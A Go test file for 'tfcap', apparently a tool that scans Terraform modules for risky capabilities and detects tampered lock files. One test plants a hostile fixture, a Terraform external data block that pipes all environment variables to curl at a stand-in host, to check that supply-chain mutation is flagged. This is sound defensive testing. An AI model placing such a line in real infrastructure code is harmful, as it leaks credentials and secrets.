package main

import (
	"bytes"
	"encoding/json"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/r-morato/tfcap/internal/lock"
	"github.com/r-morato/tfcap/internal/model"
)

const (
	before = "../../examples/upgrade-attack/before"
	after  = "../../examples/upgrade-attack/after"
)

func runCLI(t *testing.T, args ...string) (int, string, string) {
	t.Helper()
	var out, errb bytes.Buffer
	code := run(args, &out, &errb)
	return code, out.String(), errb.String()
}

func TestScanBenignIsClean(t *testing.T) {
	code, out, _ := runCLI(t, "scan", before, "--fail-on", "low", "--no-color")
	if code != 0 {
		t.Fatalf("exit %d\n%s", code, out)
	}
	if !strings.Contains(out, "2 modules, 0 capabilities") {
		t.Errorf("unexpected output:\n%s", out)
	}
}

func TestScanJSON(t *testing.T) {
	code, out, errs := runCLI(t, "scan", after, "--format", "json")
	if code != 0 {
		t.Fatalf("exit %d: %s", code, errs)
	}
	var rep model.Report
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatal(err)
	}
	if rep.Schema != model.ReportSchema || len(rep.Modules) != 2 {
		t.Fatalf("bad report: %+v", rep.Modules)
	}
	var net *model.Module
	for i := range rep.Modules {
		if rep.Modules[i].Key == "network" {
			net = &rep.Modules[i]
		}
	}
	if net == nil || !net.ThirdParty || net.Version != "1.4.1" || !strings.HasPrefix(net.Hash, "tfcap1:") {
		t.Fatalf("network module: %+v", net)
	}
}

func TestDiffFlagsUpgradeAttack(t *testing.T) {
	code, out, _ := runCLI(t, "diff", before, after, "--no-color")
	if code != 1 {
		t.Fatalf("want exit 1 (policy failure), got %d\n%s", code, out)
	}
	for _, want := range []string{
		"TFCAP-EXEC-001", "TFCAP-NET-001", "TFCAP-PROV-001", "TFCAP-IAM-002", "TFCAP-IAM-004", "TFCAP-FS-001",
		"1.4.0 → registry.terraform.io/acme-oss/network/aws@1.4.1",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("diff output missing %q", want)
		}
	}
}

func TestDiffSameIsClean(t *testing.T) {
	code, out, _ := runCLI(t, "diff", after, after, "--no-color")
	if code != 0 || !strings.Contains(out, "No new capabilities") {
		t.Fatalf("exit %d\n%s", code, out)
	}
}

func TestDiffFromJSONReports(t *testing.T) {
	dir := t.TempDir()
	b, a := filepath.Join(dir, "b.json"), filepath.Join(dir, "a.json")
	if c, _, e := runCLI(t, "scan", before, "--format", "json", "--output", b); c != 0 {
		t.Fatal(e)
	}
	if c, _, e := runCLI(t, "scan", after, "--format", "json", "--output", a); c != 0 {
		t.Fatal(e)
	}
	code, out, _ := runCLI(t, "diff", b, a, "--format", "markdown")
	if code != 1 || !strings.Contains(out, "<!-- tfcap -->") || !strings.Contains(out, "TFCAP-EXEC-001") {
		t.Fatalf("exit %d\n%s", code, out)
	}
}

func TestSARIF(t *testing.T) {
	code, out, _ := runCLI(t, "scan", after, "--format", "sarif")
	if code != 0 {
		t.Fatal(code)
	}
	var log struct {
		Version string `json:"version"`
		Runs    []struct {
			Results []struct {
				RuleID    string `json:"ruleId"`
				Locations []struct {
					PhysicalLocation struct {
						ArtifactLocation struct {
							URI string `json:"uri"`
						} `json:"artifactLocation"`
					} `json:"physicalLocation"`
				} `json:"locations"`
			} `json:"results"`
		} `json:"runs"`
	}
	if err := json.Unmarshal([]byte(out), &log); err != nil {
		t.Fatal(err)
	}
	if log.Version != "2.1.0" || len(log.Runs) != 1 || len(log.Runs[0].Results) == 0 {
		t.Fatalf("bad sarif: %s", out[:200])
	}
	uri := log.Runs[0].Results[0].Locations[0].PhysicalLocation.ArtifactLocation.URI
	if !strings.Contains(uri, ".terraform/modules/network/") {
		t.Errorf("uri = %s", uri)
	}
}

func copyTree(t *testing.T, src, dst string) {
	t.Helper()
	err := filepath.WalkDir(src, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(src, p)
		target := filepath.Join(dst, rel)
		if d.IsDir() {
			return os.MkdirAll(target, 0o755)
		}
		b, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		return os.WriteFile(target, b, 0o644)
	})
	if err != nil {
		t.Fatal(err)
	}
}

func TestLockVerifyDetectsTagMutation(t *testing.T) {
	dir := t.TempDir()
	copyTree(t, before, dir)

	if code, out, errs := runCLI(t, "lock", dir); code != 0 {
		t.Fatalf("lock: %d %s %s", code, out, errs)
	}
	lf, err := lock.Read(filepath.Join(dir, "tfcap.lock.json"))
	if err != nil || len(lf.Modules) != 1 || lf.Modules[0].Key != "network" {
		t.Fatalf("lock file: %+v %v", lf, err)
	}

	if code, out, _ := runCLI(t, "verify", dir, "--no-color"); code != 0 || !strings.Contains(out, "match the lock") {
		t.Fatalf("clean verify: %d\n%s", code, out)
	}

	// Same version, new content: what a moved git tag or a compromised
	// registry release looks like.
	evil := `data "external" "x" { program = ["sh", "-c", "env | curl -d @- https://x.example.invalid"] }`
	if err := os.WriteFile(filepath.Join(dir, ".terraform/modules/network/zz.tf"), []byte(evil), 0o644); err != nil {
		t.Fatal(err)
	}
	code, out, _ := runCLI(t, "verify", dir, "--no-color")
	if code != 1 {
		t.Fatalf("want exit 1, got %d\n%s", code, out)
	}
	for _, want := range []string{"MUTATED", "TFCAP-SRC-005", "TFCAP-EXEC-001"} {
		if !strings.Contains(out, want) {
			t.Errorf("verify output missing %q\n%s", want, out)
		}
	}
}

func TestVerifyUpgradeShowsOnlyNewCapabilities(t *testing.T) {
	dir := t.TempDir()
	copyTree(t, before, dir)
	if code, _, errs := runCLI(t, "lock", dir); code != 0 {
		t.Fatal(errs)
	}
	lockBytes, _ := os.ReadFile(filepath.Join(dir, "tfcap.lock.json"))

	up := t.TempDir()
	copyTree(t, after, up)
	os.WriteFile(filepath.Join(up, "tfcap.lock.json"), lockBytes, 0o644)

	code, out, _ := runCLI(t, "verify", up, "--format", "json")
	if code != 1 {
		t.Fatalf("want exit 1, got %d", code)
	}
	var v lock.Result
	if err := json.Unmarshal([]byte(out), &v); err != nil {
		t.Fatal(err)
	}
	if len(v.Modules) != 1 || v.Modules[0].Status != lock.StatusUpgraded {
		t.Fatalf("modules: %+v", v.Modules)
	}
	if len(v.Findings) == 0 {
		t.Fatal("expected unreviewed capabilities")
	}
	for _, f := range v.Findings {
		if f.RuleID == "TFCAP-SRC-005" {
			t.Error("upgrade must not be reported as mutation")
		}
	}
}

func TestRulesCommand(t *testing.T) {
	code, out, _ := runCLI(t, "rules", "--format", "markdown")
	if code != 0 || !strings.Contains(out, "TFCAP-EXEC-001") {
		t.Fatal(out)
	}
}

func TestBadArgs(t *testing.T) {
	if code, _, _ := runCLI(t, "nope"); code != 2 {
		t.Errorf("unknown command exit = %d", code)
	}
	if code, _, _ := runCLI(t, "scan", "/does/not/exist"); code != 2 {
		t.Errorf("missing dir exit = %d", code)
	}
	if code, _, _ := runCLI(t, "verify", t.TempDir()); code != 2 {
		t.Errorf("missing lock exit = %d", code)
	}
}

func TestNoManifestFollowsLocalModules(t *testing.T) {
	dir := t.TempDir()
	os.MkdirAll(filepath.Join(dir, "modules/app"), 0o755)
	os.WriteFile(filepath.Join(dir, "main.tf"), []byte(`
module "app" { source = "./modules/app" }
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.8.1"
}`), 0o644)
	os.WriteFile(filepath.Join(dir, "modules/app/main.tf"), []byte(`data "external" "x" { program = ["true"] }`), 0o644)
	code, out, _ := runCLI(t, "scan", dir, "--no-color")
	if code != 0 {
		t.Fatal(code)
	}
	for _, want := range []string{"module.app", "TFCAP-EXEC-001", "TFCAP-SRC-006"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q\n%s", want, out)
		}
	}
}
